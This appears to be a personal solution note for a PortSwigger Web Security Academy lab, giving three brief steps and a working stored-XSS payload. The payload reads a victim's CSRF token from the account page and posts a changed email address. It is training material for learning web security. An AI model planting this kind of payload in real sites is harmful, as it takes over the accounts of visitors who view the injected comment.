https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter



1) go on the comment functionality on a post and see that the comment body is vlnerablee to xss

2) try to change wiener email and see that it is performed using a post request to /change-email
    it contains a csrf token

3) try to create a script that first extract the csrf from the my-account page and then changes the email of the user sending a POST request to change-email


    <script>
    var req = new XMLHttpRequest();
    req.onload = extractCSRFTokenAndChangeEmail;
    req.open('get','/my-account',true);
    req.send();
    function extractCSRFTokenAndChangeEmail() {
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var changeReq = new XMLHttpRequest();
        changeReq.open('post', '/my-account/change-email', true);
        changeReq.send('csrf='+token+'&email=test@test.com')
    };
    </script>
